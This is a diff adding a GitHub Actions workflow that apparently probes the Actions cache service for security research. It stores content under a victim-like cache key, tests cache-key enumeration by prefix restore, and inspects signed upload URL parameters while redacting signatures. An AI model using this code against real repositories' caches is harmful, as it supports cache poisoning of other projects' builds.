@@ -1,0 +1,39 @@
+name: enum
+on: workflow_dispatch
+jobs:
+  writer:
+    runs-on: ubuntu-latest
+    cache-mode: write
+    steps:
+      - run: mkdir -p payload && echo "victim-legit-content" > payload/f.txt
+      - uses: actions/cache/save@v4
+        with:
+          path: payload
+          key: node-modules-linux-abc123def
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            const t=process.env.ACTIONS_RUNTIME_TOKEN, u=process.env.ACTIONS_RESULTS_URL;
+            const call = async (m, body) => {
+              const r = await fetch(`${u}twirp/github.actions.results.api.v1.CacheService/${m}`, {
+                method:'POST', headers:{'Authorization':`Bearer ${t}`,'Content-Type':'application/json','Accept':'application/json'},
+                body: JSON.stringify(body)});
+              return [r.status, await r.text()];
+            };
+            core.info('### ARM A - KEY ENUMERATION VIA PREFIX RESTORE (attacker does not know the key) ###');
+            for (const rk of [['zzz-no-such-key-0911', ['node-']], ['zzz-no-such-key-0911', ['n']], ['zzz-no-such-key-0911', ['qqqq-nothing-']]]) {
+              const [s, b] = await call('GetCacheEntryDownloadURL', {key: rk[0], restore_keys: rk[1], version:'0000000000000000000000000000000000000000000000000000000000000001'});
+              core.info(`restore_keys=${JSON.stringify(rk[1])} -> HTTP ${s} :: ${b.replace(/(https:\/\/[^"]{0,60})[^"]*/,'$1<TRUNCATED>').slice(0,420)}`);
+            }
+            core.info('### ARM B - SAS PARAM VALUES from OUR OWN mint (never the sig) ###');
+            const [s2, b2] = await call('CreateCacheEntry', {key:'hc-sasvalues-0911', version:'0000000000000000000000000000000000000000000000000000000000000003'});
+            core.info(`CreateCacheEntry HTTP ${s2}`);
+            const j = JSON.parse(b2); const su = j.signed_upload_url || '';
+            if (!su) { core.info('no upload url: ' + b2.slice(0,200)); return; }
+            const p = new URL(su);
+            for (const n of [...p.searchParams.keys()].sort()) {
+              const v = p.searchParams.get(n);
+              core.info(`  ${n} = ` + (/^(sig|skoid|sktid)$/.test(n) ? `<len ${v.length} REDACTED>` : v));
+            }
+            const st=p.searchParams.get('st'), se=p.searchParams.get('se');
+            if (st && se) core.info(`  >>> WINDOW = ${(new Date(se) - new Date(st))/60000} minutes   sp=${p.searchParams.get('sp')} sr=${p.searchParams.get('sr')}`);
